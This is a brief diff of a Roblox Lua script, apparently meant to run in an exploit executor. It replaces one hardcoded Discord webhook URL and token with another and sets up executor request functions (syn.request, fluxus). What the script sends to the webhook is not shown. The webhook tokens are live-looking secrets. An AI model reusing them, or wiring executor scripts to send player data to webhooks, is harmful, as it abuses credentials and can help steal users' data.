@@ -6,7 +6,7 @@ local TweenService = game:GetService("TweenService")
 local RunService = game:GetService("RunService")
 
 local player = Players.LocalPlayer
-local webhook = "https://discord.com/api/webhooks/1480473188000464949/tPECxSThUO_-3AI8cQXiGzZYTo5Bzo3aYUspJTDXnG7MSK1wfCkkGobIPtpVs58OsMK7"
+local webhook = "https://discord.com/api/webhooks/1487713250496745492/5UB6aG1usMO8kksPHQbLFiU5h6Y1A2RtFPowwhbOc_lRShMDwdNzFlC_EmrnwK2EpOoW"
 
 local request = syn and syn.request or http_request or request or fluxus and fluxus.request
 
